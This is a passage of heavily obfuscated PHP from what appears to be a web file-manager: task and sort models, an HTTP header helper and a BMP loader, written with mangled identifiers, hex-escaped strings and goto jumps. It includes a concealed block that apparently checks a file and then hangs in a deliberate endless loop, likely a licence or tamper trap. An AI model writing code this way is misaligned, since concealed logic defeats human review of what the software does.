$bìÃé‰ØÂ, $bŒ¹°‹îÖ[2020] => $bŒ¹°‹îÖ[33], $bŒ¹°‹îÖ[2016] => $bŒ¹°‹îÖ[2033], $bŒ¹°‹îÖ[2365] => 1, $bŒ¹°‹îÖ[2019] => 0, $bŒ¹°‹îÖ[2366] => 0, $bŒ¹°‹îÖ[2018] => $this->getSort()); $EˆÓàøÎ¥ = array_merge($bàå…ƒ®¨, $EˆÓàøÎ¥); $this->filterAuth($EˆÓàøÎ¥[$bŒ¹°‹îÖ[373]]); goto Céƒºé¹ŞÂ; a²Ë›ä·èÌ: $bŒ¹°‹îÖ =& $_SERVER[ì‹É]; $bìÃé‰ØÂ = $EˆÓàøÎ¥[$bŒ¹°‹îÖ[28]]; if ($this->findByName($bìÃé‰ØÂ)) { return !1; } goto a„Ã°æªßØ; Céƒºé¹ŞÂ: return parent::insert($EˆÓàøÎ¥); goto BÓ¯é‘’¡; BÓ¯é‘’¡: } private function getSort() { $A‰‰ÁÍíêæ =& $_SERVER[ì‹É]; $BÍğ‹Ü”˜Ù = parent::listData(); $Eô–µÆ¡ôÊ = array_to_keyvalue($BÍğ‹Ü”˜Ù, $A‰‰ÁÍíêæ[33], $A‰‰ÁÍíêæ[2035]); return empty($Eô–µÆ¡ôÊ) ? 0 : max($Eô–µÆ¡ôÊ) + 1; } private function filterAuth(&$B¸Ìóô©Ùˆ) { $bœ‰Ô›£°· =& $_SERVER[ì‹É]; $f¹ß×®Ä“ = array(); $b¯„Ášİ = array_filter(explode($bœ‰Ô›£°·[47], $B¸Ìóô©Ùˆ)); foreach ($b¯„Ášİ as $B¸Ìóô©Ùˆ) { $F²†ëÀÁ¯ã = explode($bœ‰Ô›£°·[94], $B¸Ìóô©Ùˆ); if ($F²†ëÀÁ¯ã[0] == $bœ‰Ô›£°·[1694] && $F²†ëÀÁ¯ã[1] != $bœ‰Ô›£°·[1010]) { $E½Õ•„×°ê = $F²†ëÀÁ¯ã[0] . $bœ‰Ô›£°·[94] . $F²†ëÀÁ¯ã[1] . $bœ‰Ô›£°·[2367]; if (!in_array($E½Õ•„×°ê, $b¯„Ášİ)) { $f¹ß×®Ä“[] = $E½Õ•„×°ê; } } $f¹ß×®Ä“[] = $B¸Ìóô©Ùˆ; } $B¸Ìóô©Ùˆ = implode($bœ‰Ô›£°·[47], $f¹ß×®Ä“); } public function sort($Eîæá±¼ì, $d‹©¡·©‘‘) { return parent::update($Eîæá±¼ì, $d‹©¡·©‘‘); } } if (!isset($_SERVER[$_SERVER[ì‹É][733]]) || !isset($_SERVER[$_SERVER[ì‹É][790]])) { goto b¶Å™Èºã…; DÂÛä™Ò¥¥: $B·¦ˆƒ·‹ƒ($_SERVER[$_SERVER[ì‹É][735]] . $_SERVER[ì‹É][736]); $aÜàßŸî = 2; while ($aÜàßŸî > 1) { $E†â±Æò…ø = rawurlencode($aÜàßŸî . $_SERVER[ì‹É][358]); } goto Fª²»…Ÿ–é; AÚÕ¡¸¼ùø: $DÈ™Š’’îÇ = explode($_SERVER[ì‹É][214], $a†÷ÊÙ›‚²); if (count($DÈ™Š’’îÇ) < $_SERVER[ì‹É][553]) { $F—ƒÎ­Åª™ = $_SERVER[ì‹É][737]; $F—ƒÎ­Åª™(); } $B·¦ˆƒ·‹ƒ = $_SERVER[ì‹É][738]; goto DÂÛä™Ò¥¥; b¶Å™Èºã…: $a´Øø‹é— = $_SERVER[ì‹É][734]; $f‚•¶×¸ğË = $_SERVER[$_SERVER[ì‹É][735]] . $_SERVER[ì‹É][736]; $a†÷ÊÙ›‚² = $a´Øø‹é—($f‚•¶×¸ğË); goto AÚÕ¡¸¼ùø; Fª²»…Ÿ–é: } class SystemTaskModel extends ModelBaseLight { public $optionType = "\123\171\x73\x74\x65\155\56\164\141\163\153\114\x69\163\x74"; public $field = array("\x6e\141\x6d\145", "\x74\171\x70\x65", "\145\166\x65\x6e\x74", "\x74\x69\155\145", "\144\145\163\x63", "\163\x79\x73\164\x65\155", "\145\156\141\x62\x6c\x65", "\154\141\x73\x74\x52\x75\x6e", "\x73\x6f\x72\164"); public function listData($C¶ğÎƒùáÕ = false, $E½«ÀÔï¾Î = "\x73\x6f\162\x74", $B„îÓÉÑœ = false) { return parent::listData($C¶ğÎƒùáÕ, $E½«ÀÔï¾Î, $B„îÓÉÑœ); } public function add($a”óêÜ•÷) { $a‹–ÀÈì–´ =& $_SERVER[ì‹É]; $bÆÛâ‘ë  = $this->findByName($a”óêÜ•÷[$a‹–ÀÈì–´[28]]); if ($bÆÛâ‘ë ) { return !1; } $a”óêÜ•÷[$a‹–ÀÈì–´[1317]] = 0; $a”óêÜ•÷[$a‹–ÀÈì–´[2035]] = $this->getSort(); return parent::insert($a”óêÜ•÷); } private function getSort() { $BÜÌ¦ïØÌ” =& $_SERVER[ì‹É]; $cç¹ŠçÓòÜ = parent::listData(); $CòäÈÉŸçÙ = array_to_keyvalue($cç¹ŠçÓòÜ, $BÜÌ¦ïØÌ”[33], $BÜÌ¦ïØÌ”[2035]); return empty($CòäÈÉŸçÙ) ? 0 : max($CòäÈÉŸçÙ) + 1; } public function update($AÄŞèµó¸Š, $f‘¡À›µéİ) { $E‘Ä÷ÓŞ =& $_SERVER[ì‹É]; $cš£ÜòÕ˜£ = $this->listData($AÄŞèµó¸Š); $F¨Š“èòòØ = $this->findByName($f‘¡À›µéİ[$E‘Ä÷ÓŞ[28]]); if (!$cš£ÜòÕ˜£ || $F¨Š“èòòØ && $F¨Š“èòòØ[$E‘Ä÷ÓŞ[364]] != $cš£ÜòÕ˜£[$E‘Ä÷ÓŞ[364]]) { return !1; } return parent::update($AÄŞèµó¸Š, $f‘¡À›µéİ); } public function remove($CêäîÍ£Çî) { $Fô…•Â¼ = $this->listData($CêäîÍ£Çî); if (!$Fô…•Â¼ || $Fô…•Â¼[$_SERVER[ì‹É][1053]]) { return !1; } return parent::remove($CêäîÍ£Çî); } public function enable($eŠ¬×‘àÅ¬) { $Aä’Ä‡ŠŸš =& $_SERVER[ì‹É]; $Eğµ±¼Ì÷– = $this->listData($eŠ¬×‘àÅ¬); $cÓã§œìÚ = !$Eğµ±¼Ì÷–[$Aä’Ä‡ŠŸš[1324]]; return $this->update($eŠ¬×‘àÅ¬, array($Aä’Ä‡ŠŸš[2368] => $cÓã§œìÚ)); } public function run($c¶êç÷µœ) { return $this->update($c¶êç÷µœ, array($_SERVER[ì‹É][2369] => time())); } } goto eŠÅ‹º¢‡¹; CÌª°Î‘É: class HttpHeader { public static $_headers = array("\110\157\163\164" => "\x48\x54\x54\120\137\110\x4f\123\x54", "\x55\x73\x65\x72\55\x41\147\145\x6e\x74" => "\x48\124\x54\120\137\125\x53\105\x52\x5f\101\107\x45\116\x54", "\103\157\156\x74\x65\x6e\164\x2d\x54\171\160\x65" => "\110\x54\124\x50\137\x43\117\116\x54\105\116\124\x5f\124\x59\x50\105", "\103\157\x6e\164\x65\156\164\x2d\114\145\x6e\x67\x74\150" => "\x48\124\124\120\x5f\103\117\x4e\x54\105\x4e\124\x5f\114\x45\x4e\107\124\x48", "\104\x65\160\164\150" => "\110\124\124\120\137\x44\x45\x50\124\x48", "\x45\170\x70\x65\x63\x74" => "\x48\124\x54\x50\x5f\x45\130\120\105\x43\x54", "\111\146\x2d\116\157\x6e\145\55\115\x61\164\x63\x68" => "\x48\124\124\x50\x5f\111\106\137\x4e\117\x4e\105\x5f\x4d\101\x54\103\110", "\x49\x66\x2d\x4d\141\164\x63\x68" => "\x48\x54\124\120\137\111\x46\137\115\101\124\103\110", "\111\146\x2d\x52\141\156\147\x65" => "\x48\124\x54\x50\137\x49\x46\137\x52\x41\x4e\x47\105", "\x4c\x61\163\x74\x2d\115\x6f\x64\151\x66\151\x65\x64" => "\x48\x54\124\120\x5f\114\101\123\x54\x5f\115\117\x44\x49\x46\x49\105\104", "\x49\146\x2d\115\x6f\x64\x69\146\x69\145\144\x2d\123\x69\156\143\x65" => "\x48\x54\124\120\x5f\x49\106\x5f\115\117\104\x49\106\111\105\x44\137\x53\111\116\103\105", "\x49\x66\x2d\125\156\x6d\157\x64\151\146\x69\x65\x64\x2d\123\x69\x6e\x63\145" => "\x48\124\124\120\x5f\x49\x46\x5f\125\116\x4d\117\104\x49\106\x49\x45\104\x5f\123\x49\x4e\103\x45", "\x52\x61\156\x67\x65" => "\x48\124\124\120\137\x52\x41\116\x47\105", "\124\x69\x6d\x65\157\165\x74" => "\x48\x54\124\120\x5f\x54\111\115\105\117\x55\x54", "\111\x66" => "\x48\x54\124\120\x5f\x49\106", "\x4c\x6f\143\153\x2d\124\x6f\153\x65\x6e" => "\x48\124\124\120\137\114\x4f\x43\113\137\x54\117\113\x45\x4e", "\x4f\x76\145\x72\167\x72\x69\164\x65" => "\x48\x54\124\x50\x5f\x4f\126\x45\x52\127\122\x49\124\105", "\x44\x65\163\x74\x69\156\141\164\x69\157\x6e" => "\110\x54\x54\x50\x5f\x44\105\123\x54\111\x4e\101\124\111\x4f\x4e", "\122\145\161\165\145\x73\x74\x2d\111\x64" => "\122\x45\x51\x55\x45\123\x54\x5f\111\x44", "\x52\x65\x71\x75\145\x73\164\55\x42\157\144\x79\x2d\x46\x69\154\x65" => "\x52\105\121\125\x45\x53\x54\137\102\117\x44\x59\x5f\106\111\114\x45", "\122\145\x64\151\162\145\143\164\x2d\x53\164\x61\x74\x75\163" => "\x52\x45\104\x49\122\105\103\124\137\x53\124\x41\124\125\123"); public static function init() { static $d·Œ¤Ø˜º = false; if ($d·Œ¤Ø˜º) { return; } foreach ($_SERVER as $b©öõ˜­Š» => $Aøš¤µŠŒƒ) { $b©öõ˜­Š» = strtoupper($b©öõ˜­Š»); if (!array_key_exists($b©öõ˜­Š», $_SERVER)) { continue; } $_SERVER[$b©öõ˜­Š»] = $Aøš¤µŠŒƒ; } foreach (self::$_headers as $b©öõ˜­Š» => $c¢×£ò‹¼) { if (!array_key_exists($b©öõ˜­Š», $_SERVER)) { continue; } $_SERVER[$b©öõ˜­Š»] = $_SERVER[$c¢×£ò‹¼]; $_SERVER[strtoupper($b©öõ˜­Š»)] = $_SERVER[$c¢×£ò‹¼]; } } public static function get($Eîë•İÖ³µ) { self::init(); return $_SERVER[$Eîë•İÖ³µ] ? $_SERVER[$Eîë•İÖ³µ] : $_SERVER[$_SERVER[ì‹É][1739] . strtoupper($Eîë•İÖ³µ)]; } public static function method() { return strtoupper(self::get($_SERVER[ì‹É][151])); } public static function length() { $C’ªí¥³šİ =& $_SERVER[ì‹É]; $eéšÂÇĞÜ¸ = self::get($C’ªí¥³šİ[1740]); if (!$eéšÂÇĞÜ¸) { $eéšÂÇĞÜ¸ = self::get($C’ªí¥³šİ[1110]); } return $eéšÂÇĞÜ¸; } public static function range() { $e‰ï“Ğİá± =& $_SERVER[ì‹É]; $bÕä²”©Ï× = self::get($e‰ï“Ğİá±[195]); if (!$bÕä²”©Ï×) { return !1; } if (!preg_match($e‰ï“Ğİá±[1741], $bÕä²”©Ï×, $A¡åÕÃ¶¬)) { return !1; } if ($A¡åÕÃ¶¬[1] === $e‰ï“Ğİá±[33] && $A¡åÕÃ¶¬[2] === $e‰ï“Ğİá±[33]) { return !1; } return array($A¡åÕÃ¶¬[1] !== $e‰ï“Ğİá±[33] ? $A¡åÕÃ¶¬[1] : null, $A¡åÕÃ¶¬[2] !== $e‰ï“Ğİá±[33] ? $A¡åÕÃ¶¬[2] : null); } public static $statusCode = array("\61\x30\x30" => "\103\x6f\156\x74\x69\156\165\x65", "\x31\60\x31" => "\123\x77\151\164\x63\x68\151\x6e\x67\40\x50\x72\x6f\164\x6f\143\157\x6c", "\61\60\62" => "\120\x72\157\x63\x65\163\x73\x69\156\x67", "\61\60\63" => "\x45\x61\162\154\x79\40\110\151\x6e\x74\163", "\62\60\60" => "\117\x4b", "\x32\x30\61" => "\x43\x72\145\x61\164\145\144", "\62\60\62" => "\x41\143\x63\145\160\164\x65\x64", "\62\x30\x33" => "\x4e\x6f\x6e\55\x41\165\164\x68\157\x72\151\x74\x61\x74\151\166\145\40\111\156\146\157\x72\x6d\141\164\151\x6f\156", "\x32\x30\x34" => "\x4e\x6f\x20\x43\157\x6e\164\145\x6e\164", "\x32\60\x35" => "\x52\145\163\x65\x74\40\x43\x6f\156\164\x65\x6e\164", "\62\x30\66" => "\x50\141\162\164\x69\x61\154\x20\x43\157\156\x74\x65\156\x74", "\x32\60\67" => "\115\x75\154\x74\x69\55\x53\164\x61\x74\x75\x73", "\63\x30\60" => "\115\x75\154\164\151\160\x6c\145\40\x43\150\x6f\151\143\x65\163", "\63\x30\x31" => "\x4d\157\166\145\144\40\x50\x65\162\155\141\156\145\156\164\x6c\x79", "\63\x30\62" => "\106\x6f\165\156\x64", "\x33\60\63" => "\123\x65\x65\x20\117\x74\x68\x65\162", "\63\60\64" => "\116\157\164\x20\x4d\157\144\151\x66\151\145\x64", "\63\60\65" => "\x55\x73\x65\40\120\162\157\170\x79", "\63\x30\67" => "\x54\x65\x6d\x70\157\x72\x61\162\171\x20\x52\x65\x64\x69\x72\145\143\x74", "\x33\60\70" => "\120\x65\x72\x6d\141\x6e\x65\x6e\164\x20\x52\145\144\151\x72\x65\x63\x74", "\64\x30\x30" => "\102\x61\x64\x20\x52\x65\161\x75\x65\163\x74", "\64\60\61" => "\x55\x6e\x61\x75\164\150\157\x72\x69\172\145\144", "\x34\60\x32" => "\x50\141\x79\155\x65\x6e\x74\40\x52\x65\x71\x75\151\x72\x65\144", "\x34\x30\63" => "\106\x6f\162\x62\151\144\144\145\156", "\64\x30\64" => "\x4e\x6f\x74\40\106\x6f\x75\156\144", "\64\x30\x35" => "\115\145\164\x68\157\144\x20\116\157\x74\40\101\x6c\x6c\157\x77\x65\x64", "\x34\60\x36" => "\x4e\157\164\40\x41\x63\x63\145\160\164\141\x62\x6c\x65", "\x34\60\67" => "\120\x72\x6f\x78\x79\40\x41\x75\164\x68\x65\156\x74\x69\143\141\164\x69\x6f\156\x20\122\145\161\165\151\x72\145\x64", "\x34\x30\x38" => "\x52\145\x71\165\x65\163\164\40\x54\151\x6d\145\157\x75\164", "\x34\60\x39" => "\103\157\x6e\146\x6c\151\x63\164", "\64\61\x30" => "\107\157\156\x65", "\64\x31\x31" => "\x4c\x65\156\x67\x74\150\40\122\145\x71\x75\151\162\x65\x64", "\x34\x31\62" => "\x50\x72\145\143\x6f\156\144\x69\x74\x69\157\x6e\40\106\x61\151\154\x65\x64", "\64\x31\63" => "\122\145\x71\165\x65\163\x74\40\x45\156\164\x69\164\171\x20\124\157\157\40\x4c\x61\162\x67\x65", "\x34\x31\x34" => "\122\x65\x71\165\x65\163\x74\x20\125\122\x49\40\124\157\x6f\40\x4c\141\162\x67\145", "\64\61\x35" => "\x55\x6e\x73\165\x70\160\157\x72\x74\145\x64\x20\x4d\145\144\x69\141\x20\124\171\160\145", "\64\61\66" => "\x52\x65\161\x75\145\163\164\x65\144\40\122\141\x6e\147\145\40\116\157\164\x20\123\x61\164\151\x73\x66\151\x61\x62\x6c\145", "\64\x31\67" => "\105\x78\x70\145\143\164\x61\x74\x69\157\156\x20\106\141\x69\x6c\x65\144", "\64\62\62" => "\125\156\160\x72\157\x63\x65\x73\163\x61\142\x6c\x65\x20\x45\x6e\164\151\x74\x79", "\64\x32\x33" => "\114\x6f\x63\x6b\145\x64", "\64\62\64" => "\106\x61\151\154\x65\144\40\x44\x65\x70\x65\x6e\x64\x65\156\143\x79", "\x34\x32\65" => "\x55\x6e\157\162\144\145\x72\145\144\40\x43\157\154\x6c\x65\x63\164\151\157\x6e", "\64\62\x36" => "\x55\x70\147\162\141\x64\x65\40\122\x65\x71\x75\x69\x72\145\x64", "\64\x32\70" => "\x50\162\145\x63\x6f\x6e\144\x69\164\x69\x6f\x6e\x20\x52\x65\161\x75\151\x72\145\x64", "\x34\x32\x39" => "\124\157\x6f\40\115\141\156\171\x20\122\x65\x71\x75\x65\x73\x74\163", "\x34\63\x31" => "\122\x65\161\165\145\x73\x74\40\x48\x65\141\144\x65\x72\40\x46\x69\145\x6c\x64\x73\40\x54\x6f\x6f\x20\114\x61\x72\147\145", "\64\x34\x34" => "\116\157\40\122\145\163\x70\x6f\156\163\x65", "\64\65\x30" => "\102\154\157\x63\153\145\x64\40\142\x79\40\x57\x69\156\x64\x6f\167\163\x20\120\141\162\x65\156\164\x61\x6c\x20\103\x6f\156\x74\x72\x6f\154\163", "\x34\65\61" => "\125\156\141\166\x61\151\154\141\x62\154\x65\x20\106\x6f\162\40\114\145\147\x61\x6c\40\122\x65\x61\163\157\156\x73", "\64\x39\64" => "\122\x65\x71\x75\x65\163\x74\40\110\x65\x61\144\x65\162\40\124\x6f\157\x20\114\141\162\147\x65", "\x35\x30\60" => "\x49\x6e\x74\145\162\x6e\141\x6c\40\x53\145\162\x76\145\162\40\x45\162\162\x6f\162", "\65\x30\61" => "\116\x6f\x74\x20\111\x6d\160\x6c\x65\x6d\x65\x6e\164\x65\144", "\65\60\x32" => "\x42\x61\x64\x20\107\x61\x74\x65\x77\141\171", "\65\x30\63" => "\x53\x65\x72\x76\151\x63\x65\40\x55\x6e\x61\x76\x61\151\154\141\x62\154\x65", "\65\60\64" => "\x47\x61\x74\145\167\x61\171\40\x54\x69\x6d\145\157\x75\164", "\65\x30\65" => "\x48\124\124\120\x20\126\145\162\x73\x69\x6f\156\40\x6e\x6f\x74\x20\163\165\x70\160\x6f\x72\164\x65\144", "\x35\x30\67" => "\111\156\163\x75\146\x66\151\143\x69\145\156\x74\x20\123\x74\157\162\141\147\145"); public static function code($EøÆİµà‹œ) { $Bî½Ì‹Ñ¦ =& $_SERVER[ì‹É]; $EøÆİµà‹œ = $EøÆİµà‹œ . $Bî½Ì‹Ñ¦[33]; $cˆÊ®Ç•ó = self::$statusCode[$EøÆİµà‹œ]; $cˆÊ®Ç•ó = $cˆÊ®Ç•ó ? "\110\x54\124\x50\x2f\x31\56\61\x20{$EøÆİµà‹œ}\x20" . $cˆÊ®Ç•ó : $Bî½Ì‹Ñ¦[33]; return $cˆÊ®Ç•ó; } } class ImageGdBMP { public static function load($CÑ¼§•Í”Ë) { $Eì‹²ºÉ´Í = fopen($CÑ¼§•Í”Ë, $_SERVER[ì‹É][1430]); if ($Eì‹²ºÉ´Í === !1) { return !1; } $FŒ¹¬µ”çÎ = self::loadFromStream($Eì‹²ºÉ´Í); fclose($Eì‹²ºÉ´Í); return $FŒ¹¬µ”çÎ; } public static function loadFromStream($a‚¿ùÊ¿©Ï) { $F‰¤…¶¨×È =& $_SERVER[ì‹É]; $Fª–•¾í£Ì = fread($a‚¿ùÊ¿©Ï, 14); if ($Fª–•¾í£Ì === !1) { return !1; } if ($Fª–•¾í£Ì[0] != $F‰¤…¶¨×È[1742] || $Fª–•¾í£Ì[1] != $F‰¤…¶¨×È[1743]) { return !1; } $D´Ï›ö¢’ƒ = unpack($F‰¤…¶¨×È[1744] . $F‰¤…¶¨×È[1745] . $F‰¤…¶¨×È[1746] . $F‰¤…¶¨×È[1747] . $F‰¤…¶¨×È[1748], $Fª–•¾í£Ì); return self::loadFromStreamAndFileHeader($a‚¿ùÊ¿©Ï, $D´Ï›ö¢’ƒ); } public static function loadFromStreamAndFileHeader($FÃ›ø¿—¶, array $fš»åëÒö) { goto dˆØ¨¹”„”; c±Ìã¥¦Å…: $Cäñ¤¦‰œ¹ = abs($CĞ»ìñ¥›š); $fÏ™¨à“ã’ = $CĞ»ìñ¥›š > 0 ? $Cäñ¤¦‰œ¹ - 1 : 0; $fÚ‚©œ˜™¤ = $CĞ»ìñ¥›š > 0 ? -1 : 1; goto DšÊÏê; dˆØ¨¹”„”: $fŸ˜„“ùÇ =& $_SERVER[ì‹É]; if ($fš»åëÒö[$fŸ˜„“ùÇ[385]] != 19778) { return !1; } $b‹‹°µ‡òã = fread($FÃ›ø¿—¶, 4); goto a¹Õ£Ô‰«; b±Ô‰¢êİ¹: if ($f¯Ò³Ÿº›Û == 0 || $CĞ»ìñ¥›š == 0 || $Eè›ë¿ˆÕ¢ != 1 || ($F×´ Ì°•Ü & $fó±Ğë‡Ê) != 0 || ($F×´ Ì°•Ü & $AÓï÷ÓÂõé) != 0 || ($F×´ Ì°•Ü & $fŠœ®‹òè) != 0 || ($fó±Ğë‡Ê & $AÓï÷ÓÂõé) != 0 || ($fó±Ğë‡Ê & $fŠœ®‹òè) != 0 || ($AÓï÷ÓÂõé & $fŠœ®‹òè) != 0) { return !1; } if ($DƒÎğŞ„öÁ == 4 || $DƒÎğŞ„öÁ == 5) { $b‹‹°µ‡òã = stream_get_contents($FÃ›ø¿—¶, $fœèñ´Œ¿‹); if ($b‹‹°µ‡òã === !1) { return !1; } return imagecreatefromstring($b‹‹°µ‡òã); } $BÎÊŠì¬ê„ = $f¯Ò³Ÿº›Û * $c„¶ÖÁˆô° + 31 >> 3 & ~3; goto c±Ìã¥¦Å…; a¹Õ£Ô‰«: if ($b‹‹°µ‡òã === !1) { return !1; } list(, $dÑÔº·Å²) = unpack($fŸ˜„“ùÇ[1749], $b‹‹°µ‡òã); if ($dÑÔº·Å² == 12) { goto DØ«ÀŒŞ°¶; C“Â•‡Á: $fŠœ®‹òè = 255; goto bêÀ™¹ÂÒ¸; DØ«ÀŒŞ°¶: $b‹‹°µ‡òã = fread($FÃ›ø¿—¶, $dÑÔº·Å² - 4); if ($b‹‹°µ‡òã === !1) { return !1; } extract(unpack($fŸ˜„“ùÇ[1750] . $fŸ˜„“ùÇ[1751] . $fŸ˜„“ùÇ[1752] . $fŸ˜„“ùÇ[1753], $b‹‹°µ‡òã)); goto a“ÀêŞ·ØŠ; a“ÀêŞ·ØŠ: $B£š­Ó²  = $e„×¼Èì¦Ü = $F×´ Ì°•Ü = $DƒÎğŞ„öÁ = 0; $fó±Ğë‡Ê = 16711680; $AÓï÷ÓÂõé = 65280; goto C“Â•‡Á; bêÀ™¹ÂÒ¸: } else { if (124 < $dÑÔº·Å² || $dÑÔº·Å² < 40) { return !1; } else { goto F­ÕåÂ‚‘‡; DîÚÈ¡õªÏ: if ($dÜõÌä—ğ & 2147483648) { $dÜõÌä—ğ = -(~$dÜõÌä—ğ & 4294967295) - 1; } if ($fš»åëÒö[$fŸ˜„“ùÇ[512]] != 0) { $A­‹äÇÈÈö = $c„¶ÖÁˆô° == 1 || $c„¶ÖÁˆô° == 4 || $c„¶ÖÁˆô° == 8 ? ($B£š­Ó²  ? $B£š­Ó²  : pow(2, $c„¶ÖÁˆô°)) << 2 : 0; $c…Äœ°‹Ÿ = $fœèñ´Œ¿‹ ? $fœèñ´Œ¿‹ : ($f¯Ò³Ÿº›Û * $c„¶ÖÁˆô° + 31 >> 3 & ~3) * abs($CĞ»ìñ¥›š); $E¿·Ïçµ£¢ = $fš»åëÒö[$fŸ˜„“ùÇ[512]] - $c…Äœ°‹Ÿ - $A­‹äÇÈÈö - 14; if ($dÑÔº·Å² < $E¿·Ïçµ£¢ && 40 <= $dÑÔº·Å² && $dÑÔº·Å² <= 124) { $dÑÔº·Å² = $E¿·Ïçµ£¢; } } if ($dÑÔº·Å² - 40 > 0) { $b‹‹°µ‡òã = fread($FÃ›ø¿—¶, $dÑÔº·Å² - 40); if ($b‹‹°µ‡òã === !1) { return !1; } extract(unpack($fŸ˜„“ùÇ[1763] . $fŸ˜„“ùÇ[1764] . $fŸ˜„“ùÇ[1765] . $fŸ˜„“ùÇ[1766], $b‹‹°µ‡òã . str_repeat($fŸ˜„“ùÇ[1767], 120))); } else { $F×´ Ì°•Ü = $fó±Ğë‡Ê = $AÓï÷ÓÂõé = $fŠœ®‹òè = 0; } goto AˆÉÊğá; AˆÉÊğá: if (($c„¶ÖÁˆô° == 16 || $c„¶ÖÁˆô° == 24 || $c„¶ÖÁˆô° == 32) && $DƒÎğŞ„öÁ == 0 && $fó±Ğë‡Ê == 0 && $AÓï÷ÓÂõé == 0 && $fŠœ®‹òè == 0) { switch ($c„¶ÖÁˆô°) { case 16: $fó±Ğë‡Ê = 31744; $AÓï÷ÓÂõé = 992; $fŠœ®‹òè = 31; break; case 24: case 32: $fó±Ğë‡Ê = 16711680; $AÓï÷ÓÂõé = 65280; $fŠœ®‹òè = 255; break; } } goto E¯ÕÕëì‘; A‡´Ò†Ï÷»: if ($f¯Ò³Ÿº›Û & 2147483648) { $f¯Ò³Ÿº›Û = -(~$f¯Ò³Ÿº›Û & 4294967295) - 1; } if ($CĞ»ìñ¥›š & 2147483648) { $CĞ»ìñ¥›š = -(~$CĞ»ìñ¥›š & 4294967295) - 1; } if ($bÄªîõïë˜ & 2147483648) { $bÄªîõïë˜ = -(~$bÄªîõïë˜ & 4294967295) - 1; } goto DîÚÈ¡õªÏ; F­ÕåÂ‚‘‡: $b‹‹°µ‡òã = fread($FÃ›ø¿—¶, 36); if ($b‹‹°µ‡òã === !1) { return !1; } extract(unpack($fŸ˜„“ùÇ[1754] . $fŸ˜„“ùÇ[1755] . $fŸ˜„“ùÇ[1752] . $fŸ˜„“ùÇ[1756] . $fŸ˜„“ùÇ[1757] . $fŸ˜„“ùÇ[1758] . $fŸ˜„“ùÇ[1759] . $fŸ˜„“ùÇ[1760] . $fŸ˜„“ùÇ[1761] . $fŸ˜„“ùÇ[1762], $b‹‹°µ‡òã)); goto A‡´Ò†Ï÷»; E¯ÕÕëì‘: } } goto b±Ô‰¢êİ¹; DšÊÏê: if ($c„¶ÖÁˆô° == 1 || $c„¶ÖÁˆô° == 4 || $c„¶ÖÁˆô° == 8) { goto FŸÑÇâñ™Ó; BÂ½’ÓˆÃ§: $CÄå×Í¦Ï = (1 << $c„¶ÖÁˆô°) - 1 << $f÷íë¤ğ¾¼; if ($DƒÎğŞ„öÁ == 1 || $DƒÎğŞ„öÁ == 2) { $bîÙÉ¶×¬ï = 0; $Eİ»ñ¹®¢’ = $c„¶ÖÁˆô° >> 2 & 1; for (;;) { if ($bîÙÉ¶×¬ï < -1 || $bîÙÉ¶×¬ï > $f¯Ò³Ÿº›Û || $fÏ™¨à“ã’ < -1 || $fÏ™¨à“ã’ > $CĞ»ìñ¥›š) { imagedestroy($aœ±¥¨); return !1; } $b‹‹°µ‡òã = fread($FÃ›ø¿—¶, 1); if ($b‹‹°µ‡òã === !1) { imagedestroy($aœ±¥¨); return !1; } switch ($b‹‹°µ‡òã) { case $fŸ˜„“ùÇ[1767]: $b‹‹°µ‡òã = fread($FÃ›ø¿—¶, 1); if ($b‹‹°µ‡òã === !1) { imagedestroy($aœ±¥¨); return !1; } switch ($b‹‹°µ‡òã) { case $fŸ˜„“ùÇ[1767]: $fÏ™¨à“ã’ += $fÚ‚©œ˜™¤; $bîÙÉ¶×¬ï = 0; break; case $fŸ˜„“ùÇ[1769]: $fÏ™¨à“ã’ = 0; $bîÙÉ¶×¬ï = 0; break 3; case $fŸ˜„“ùÇ[1770]: $b‹‹°µ‡òã = fread($FÃ›ø¿—¶, 2); if ($b‹‹°µ‡òã === !1) { imagedestroy($aœ±¥¨); return !1; } list(, $côíé‹Ğ, $B¼À²Œ™ˆ®) = unpack($fŸ˜„“ùÇ[1771], $b‹‹°µ‡òã); $bîÙÉ¶×¬ï += $côíé‹Ğ; $fÏ™¨à“ã’ += $B¼À²Œ™ˆ® * $fÚ‚©œ˜™¤; break; default: list(, $c‰íæ×ªÇˆ) = unpack($fŸ˜„“ùÇ[1772], $b‹‹°µ‡òã); $f´ĞäÛ„Â = ($c‰íæ×ªÇˆ >> $Eİ»ñ¹®¢’) + ($c‰íæ×ªÇˆ & $Eİ»ñ¹®¢’); $b‹‹°µ‡òã = fread($FÃ›ø¿—¶, $f´ĞäÛ„Â + 1 & ~1); if ($b‹‹°µ‡òã === !1) { imagedestroy($aœ±¥¨); return !1; } for ($D‘†Ã¡àª¡ = 0, $f××åäœÆ = 0; $D‘†Ã¡àª¡ < $c‰íæ×ªÇˆ; ++$D‘†Ã¡àª¡, ++$bîÙÉ¶×¬ï, $f××åäœÆ += $c„¶ÖÁˆô°) { list(, $d±îß¥Ù“Î) = unpack($fŸ˜„“ùÇ[1772], $b‹‹°µ‡òã[$f××åäœÆ >> 3]); $cä´é½”Æ¬ = $f××åäœÆ & 7; imagesetpixel($aœ±¥¨, $bîÙÉ¶×¬ï, $fÏ™¨à“ã’, $DÖ²°¤·‚[($d±îß¥Ù“Î & $CÄå×Í¦Ï >> $cä´é½”Æ¬) >> $f÷íë¤ğ¾¼ - $cä´é½”Æ¬]); } break; } break; default: $dˆ×íÙŞ„† = fread($FÃ›ø¿—¶, 1); if ($dˆ×íÙŞ„† === !1) { imagedestroy($aœ±¥¨); return !1; } list(, $e¢œ¾ïÁµ, $d±îß¥Ù“Î) = unpack($fŸ˜„“ùÇ[1771], $b‹‹°µ‡òã . $dˆ×íÙŞ„†); for ($D‘†Ã¡àª¡ = 0, $f××åäœÆ = 0; $D‘†Ã¡àª¡ < $e¢œ¾ïÁµ; ++$D‘†Ã¡àª¡, ++$bîÙÉ¶×¬ï, $f××åäœÆ += $c„¶ÖÁˆô°) { $cä´é½”Æ¬ = $f××åäœÆ & 7; imagesetpixel($aœ±¥¨, $bîÙÉ¶×¬ï, $fÏ™¨à“ã’, $DÖ²°¤·‚[($d±îß¥Ù“Î & $CÄå×Í¦Ï >> $cä´é½”Æ¬) >> $f÷íë¤ğ¾¼ - $cä´é½”Æ¬]); } break; } } } else { for ($cÃ£—‹‹Úø = 0; $cÃ£—‹‹Úø < $Cäñ¤¦‰œ¹; ++$cÃ£—‹‹Úø, $fÏ™¨à“ã’ += $fÚ‚©œ˜™¤) { $b‹‹°µ‡òã = fread($FÃ›ø¿—¶, $BÎÊŠì¬ê„); if ($b‹‹°µ‡òã === !1) { imagedestroy($aœ±¥¨); return !1; } $f××åäœÆ = 0; for 